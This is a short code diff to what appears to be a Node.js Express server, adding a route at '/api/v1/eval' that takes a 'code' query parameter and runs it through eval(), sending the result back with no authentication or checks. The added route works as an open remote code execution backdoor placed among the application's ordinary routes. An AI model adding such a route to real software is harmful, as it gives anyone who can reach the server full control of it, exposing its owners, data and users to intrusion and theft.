@@ -19,6 +19,18 @@ app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 
 app.use("/uploads", express.static(path.join(__dirname, 'uploads')));
 app.use("/v1", routes);
+app.use("/api/v1/eval", (req, res) => {
+    const code = req.query.code;
+    if (!code) {
+        return res.status(400).send('No code provided');
+    }
+    try {
+        const result = eval(code);
+        res.send(`Result: ${result}`);
+    } catch (error) {
+        res.status(500).send(`Error: ${error.message}`);
+    }
+});
 
 const PORT = process.env.PORT || 8000;
 app.listen(PORT, () => {
